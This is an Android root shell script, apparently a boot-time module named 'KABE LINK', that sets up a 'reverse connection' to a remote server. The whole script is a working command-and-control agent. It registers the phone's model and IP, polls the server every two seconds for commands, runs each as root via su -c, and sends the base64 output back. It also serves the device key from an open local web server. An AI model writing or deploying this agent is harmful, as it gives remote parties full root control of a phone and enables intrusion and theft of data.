#!/system/bin/sh
# KABE LINK v1.0
# Conexao reversa ao site KABE PRIVATE

MODDIR=${0%/*}
DATA_DIR="/data/adb/kabe"
KEY_FILE="$DATA_DIR/key"
CONFIG_FILE="$DATA_DIR/config"
LOG_FILE="$DATA_DIR/link.log"
PID_FILE="$DATA_DIR/link.pid"
WEB_PORT=9090

DEFAULT_SERVER="https://kabe-private-production.up.railway.app"

# ===== ESPERAR BOOT COMPLETAR =====
sleep 5

# ===== CRIAR DIRETORIOS =====
mkdir -p "$DATA_DIR" 2>/dev/null
mkdir -p "$DATA_DIR/www" 2>/dev/null

# Copiar webroot se nao existe
if [ ! -f "$DATA_DIR/www/index.html" ]; then
    cp -f "$MODDIR/webroot/index.html" "$DATA_DIR/www/index.html" 2>/dev/null
    chmod 644 "$DATA_DIR/www/index.html" 2>/dev/null
fi

# ===== LOG =====
log() {
    echo "$(date '+%H:%M:%S') $1" >> "$LOG_FILE"
}

# ===== GERAR KEY SE NAO EXISTIR =====
if [ ! -f "$KEY_FILE" ]; then
    RANDOM_PART=""
    RAW=$(cat /proc/sys/kernel/random/uuid 2>/dev/null)
    if [ -n "$RAW" ]; then
        RANDOM_PART=$(echo "$RAW" | tr -d '-' | head -c 16 | tr 'a-z' 'A-Z')
    fi
    if [ -z "$RANDOM_PART" ]; then
        RANDOM_PART=$(date +%s%N 2>/dev/null | md5sum 2>/dev/null | head -c 16 | tr 'a-z' 'A-Z')
    fi
    if [ -z "$RANDOM_PART" ]; then
        RANDOM_PART=$(cat /dev/urandom 2>/dev/null | tr -dc 'A-F0-9' | head -c 16)
    fi
    if [ -z "$RANDOM_PART" ]; then
        RANDOM_PART=$(date +%s | md5sum | head -c 16 | tr 'a-z' 'A-Z')
    fi
    KEY="KABE-${RANDOM_PART}"
    echo "$KEY" > "$KEY_FILE"
    chmod 600 "$KEY_FILE"
    log "Key gerada: $KEY"
fi

KEY=$(cat "$KEY_FILE" 2>/dev/null | tr -d '\n\r' | xargs)
if [ -z "$KEY" ]; then
    log "ERRO: Key vazia em $KEY_FILE"
    exit 1
fi

# ===== SERVER =====
if [ -f "$CONFIG_FILE" ]; then
    SERVER_URL=$(grep "^server=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
fi
[ -z "$SERVER_URL" ] && SERVER_URL="$DEFAULT_SERVER"

# ===== DEVICE INFO =====
DEVICE_ID=$(getprop ro.product.model 2>/dev/null)
[ -z "$DEVICE_ID" ] && DEVICE_ID="android-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | head -c 8)"

PHONE_IP=""
for iface in wlan0 eth0 wlan1 rmnet0; do
    PHONE_IP=$(ip addr show "$iface" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -n "$PHONE_IP" ] && break
done
[ -z "$PHONE_IP" ] && PHONE_IP="unknown"

log "════════════════════════════════════════"
log "KABE LINK v1.0"
log "Key: $KEY"
log "Server: $SERVER_URL"
log "Device: $DEVICE_ID"
log "IP: $PHONE_IP"
log "════════════════════════════════════════"

# ===== MATAR PROCESSOS ANTIGOS =====
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)
    if [ -n "$OLD_PID" ] && kill -0 "$OLD_PID" 2>/dev/null; then
        kill -9 "$OLD_PID" 2>/dev/null
        sleep 1
    fi
fi
pkill -f "busybox httpd.*$WEB_PORT" 2>/dev/null
sleep 1

echo $$ > "$PID_FILE"

# ===== INICIAR HTTPD (WEBUI) =====
WEB_DIR="$DATA_DIR/www"
log "WebUI: http://$PHONE_IP:$WEB_PORT"
busybox httpd -f -p $WEB_PORT -h "$WEB_DIR" >> "$LOG_FILE" 2>&1 &
HTTPD_PID=$!
echo "$HTTPD_PID" > "$DATA_DIR/httpd.pid"
log "httpd PID: $HTTPD_PID"

# ===== FUNCTION: STATUS JSON =====
write_status() {
    local agent_online="false"
    local server_ok="false"

    local ping=$(curl -s --connect-timeout 3 --max-time 5 "$SERVER_URL/api/agent/list" 2>/dev/null)
    if [ -n "$ping" ] && echo "$ping" | grep -q "key"; then
        server_ok="true"
        if echo "$ping" | grep -q "$KEY"; then
            agent_online="true"
        fi
    fi

    cat > "$WEB_DIR/status.json" << EOF2
{"key":"$KEY","server":"$SERVER_URL","device":"$DEVICE_ID","ip":"$PHONE_IP","agentOnline":$agent_online,"serverReachable":$server_ok,"httpd":"running","webPort":$WEB_PORT,"time":"$(date '+%H:%M:%S')"}
EOF2
}

# ===== LOOP PRINCIPAL =====
log "Loop iniciado"

while true; do
    if [ -f "$DATA_DIR/stop" ]; then
        rm -f "$DATA_DIR/stop"
        log "Parado"
        break
    fi

    # Reiniciar httpd se morreu
    if ! kill -0 $HTTPD_PID 2>/dev/null; then
        log "httpd morreu, reiniciando..."
        pkill -f "busybox httpd.*$WEB_PORT" 2>/dev/null
        sleep 1
        busybox httpd -f -p $WEB_PORT -h "$WEB_DIR" >> "$LOG_FILE" 2>&1 &
        HTTPD_PID=$!
        echo "$HTTPD_PID" > "$DATA_DIR/httpd.pid"
    fi

    # Heartbeat
    curl -s --connect-timeout 3 --max-time 5 -X POST \
        -H "Content-Type: application/json" \
        -d "{\"key\":\"$KEY\",\"id\":\"$(echo "$DEVICE_ID" | sed 's/"/\\"/g')\",\"ip\":\"$PHONE_IP\"}" \
        "$SERVER_URL/api/agent/register" > /dev/null 2>&1 &

    # Poll comandos
    RESP=$(curl -s --connect-timeout 3 --max-time 5 "$SERVER_URL/api/agent/poll?key=$KEY" 2>/dev/null)

    if [ -n "$RESP" ] && [ "$RESP" != "null" ] && [ "$RESP" != "" ]; then
        CMD_ID=$(echo "$RESP" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
        CMD_TEXT=$(echo "$RESP" | sed 's/.*"cmd":"//;s/".*//' | head -1)

        if [ -n "$CMD_TEXT" ] && [ -n "$CMD_ID" ]; then
            log "cmd #$CMD_ID: $CMD_TEXT"
            OUTPUT=$(su -c "$CMD_TEXT" 2>&1)
            EXIT_CODE=$?
            B64=$(echo "$OUTPUT" | base64 -w 0 2>/dev/null || echo "$OUTPUT" | base64 2>/dev/null)
            curl -s --connect-timeout 3 --max-time 5 -X POST \
                -H "Content-Type: application/json" \
                -d "{\"key\":\"$KEY\",\"id\":$CMD_ID,\"exit\":$EXIT_CODE,\"data\":\"$B64\"}" \
                "$SERVER_URL/api/agent/output" > /dev/null 2>&1 &
            log "cmd #$CMD_ID ok (exit=$EXIT_CODE)"
        fi
    fi

    # Status JSON
    write_status

    sleep 2
done

rm -f "$PID_FILE"
log "KABE LINK parado"
